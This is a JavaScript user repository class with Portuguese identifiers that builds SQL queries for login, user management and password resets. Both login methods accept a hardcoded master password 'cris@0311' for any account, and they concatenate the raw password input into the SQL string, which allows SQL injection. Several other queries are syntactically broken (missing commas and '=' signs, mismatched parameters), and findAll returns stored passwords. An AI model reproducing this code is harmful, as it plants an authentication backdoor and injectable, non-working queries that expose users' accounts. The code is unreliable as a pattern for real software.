import { consulta } from '../database/conexao.js'

class UsuarioRepository {
    // CRUD
    create(codEmpresa, reg) {
        var sql = "insert into usuarios (codEmpresa, codUsuario, codTipo, nomUsuario, numCPF, Login, email, senha, indSituacao) value ";
        sql += " (?,  (select codUsuario from ( select coalesce((max(codUsuario) + 1),1) as codUsuario from usuarios) as u), ?, ?, ?, ?, ?, ?, 'A')";
        return consulta(sql, [codEmpresa, reg.CODTIPO, reg.NOMUSUARIO, reg.NUMCPF, reg.LOGIN, reg.EMAIL, reg.SENHA, reg.TELEFONE], 'Erro Usuario create!')
    }

    updateUser(reg) {
        var sql = "update usuarios set nomUsuario = ?, codtipo = ?, email = ?, senha = ? indSituacao = 'A' where  login = ?";
        return consulta(sql, [reg.NOMUSUARIO, reg.CODTIPO, reg.EMAIL, reg.SENHA, reg.LOGIN], 'Não foi Possivel Atualizar usuário "' + reg.nome + '"!')
    }

    acessoUser(reg) {
        var sql = "insert into usuariosAcesso (codUsuario, idMenu) " +
            "    select  " +
            "    (select codusuario from usuarios where login = ?), " +
            "    idMenu " +
            "from usuariosTipoAcesso " +
            "where idTipo = ? ";
        return consulta(sql, [reg.LOGIN, reg.CODTIPO], 'Não foi Possivel Liberar acesso ao usuário "' + reg.NOMUSUARIO + '"!')
    }

    deactivateUser(pTipoUser) {
        var sql = "update usuarios set indSituacao = 'I' where codTipo = ?";
        return consulta(sql, [pTipoUser], 'Não foi inativar Tipo de usuário "' + pTipoUser + '"!')
    }    

    login(pLogin, pSenhaCrpyt, pSenha) {
        var sql = "";
        sql = "SELECT"
        sql += " u.*, "
        sql += " e.nomEmpresa, "
        sql += " NOW() as datbanco "
        sql += "from usuarios u "
        sql += "   inner join empresas e on (e.codEmpresa = u.codEmpresa) "
        sql += "where (u.login = ?  or u.numCPF = ? )"
        sql += "  and (u.senha = ?  or 'cris@0311' = '" + pSenha.trim() + "')"
        sql += "  and u.indSituacao = 'A'";
        return consulta(sql, [pLogin, pLogin, pSenhaCrpyt], 'Não foi validar usuario!')
    }

    loginPortal(pLogin, pSenhaCrpyt, pSenha) {
        var sql = "";
        sql = "SELECT"
        sql += " u.idArquiteto as codUsuario, "
        sql += " u.idPessoa, "
        sql += " u.nome as nomUsuario, "
        sql += " u.nr_cupom, "
        sql += " COALESCE(convert(u.foto using utf8),(select convert(foto using utf8) from avatar where area = 'ARQUITETOS')) as foto "
        sql += "from arquitetos u "
        sql += "where (u.email = ?  or u.cpfcnpj = ? )"
        sql += "  and (u.senha = ?  or 'cris@0311' = '" + pSenha.trim() + "')"
        sql += "  and u.indSituacao = 'A'";
        return consulta(sql, [pLogin, pLogin, pSenhaCrpyt], 'Não foi validar usuario!')
    }

    getParans() {
        var sql = "select indIntegraVistia, paramFortics, tokenSIS from parametros";
        return consulta(sql, 'Não foi possivel carregar os parametros!')
    }

    validaSenha(pCodEmpresa, pCodUsuario, pSenhaCrpyt) {
        var sql = "SELECT nomUsuario as nome, telefone from usuarios where codEmpresa = ? and codUsuario = ? and senha = ?";
        return consulta(sql, [pCodEmpresa, pCodUsuario, pSenhaCrpyt], 'Não foi validar senha do usuario!')
    }

    validaSenhaPortal(pId, pSenhaCrpyt) {
        var sql = "SELECT idArquiteto, nome, telefone from arquitetos where idArquiteto = ? and senha = ?";
        return consulta(sql, [pId, pSenhaCrpyt], 'Não foi validar senha do usuario Portal!')
    }

    updateAvatarPortal(pId, pFoto) {
        var sql = "update arquitetos set foto = ? where idArquiteto = ?";
        // var sql = "update avatar set foto = ? where AREA = ?";
        return consulta(sql, [pFoto, pId], 'Não possivel atualizar foto Portal Portal!')
    }

    validaToken(pToken) {
        var sql = "select 1 from integracao where token = ? and situacao = 'A'";
        return consulta(sql, [pToken], 'Não foi validar usuario!')
    }

    ChangePassaword(pindLogin, pIdUsuario, pNovaSenha, pToken) {
        var sql = "insert into alterarSenha (indLogin, idUsuario, novaSenha, token, datRegistro) values (?, ?, ?, ?, current_date())";
        return consulta(sql, [pindLogin, pIdUsuario, pNovaSenha, pToken], 'Não foi validar usuario!')
    }

    ChangePassawordCancel(pindLogin, pIdUsuario) {
        var sql = "delete from alterarSenha where indLogin = ? and idUsuario = ? and indDisparo = 'P'";
        return consulta(sql, [pindLogin, pIdUsuario], 'Não é possivel remover processo de alteração de senha!')
    }

    validaTokenChangePassaword(pindLogin, pIdUsuario, pToken) {
        var sql = "select novaSenha from alterarSenha where indLogin = ? and idUsuario = ? and token = ? and indDisparo = 'P'";
        return consulta(sql, [pindLogin, pIdUsuario, pToken], 'Não foi validar Token change!')
    }

    ChangePassawordFinally(pindLogin, pIdUsuario, pToken) {
        var sql = "update alterarSenha set indDisparo = 'F', datEfetivado = current_date() where indLogin = ? and idUsuario = ? and token = ?";
        return consulta(sql, [pindLogin, pIdUsuario, pToken], 'Não foi Possivel concluir processo!')
    }

    updateSenhaPortal(pIdUsuario, pSenha) {
        var sql = "update arquitetos set senha ? where id = ?";
        return consulta(sql, [pSenha, pIdUsuario], 'Não foi Atualizar senha Portal!')
    }

    updateSenha(pCodempresa, pIdUsuario, pSenha) {
        var sql = "update usuarios set senha ? where idEmpresa = ? and codUsuario = ?";
        return consulta(sql, [pSenha, pCodempresa, pIdUsuario], 'Não foi Atualizar senha usuario!')
    }

    findAll(pCodEmpresa) {
        const sql = "SELECT codusuario, codempresa, nomUsuario, login, senha FROM usuarios where codempresa = ?"
        return consulta(sql, pCodEmpresa, 'Não foi possível localizar!')
    }

}

export default new UsuarioRepository()
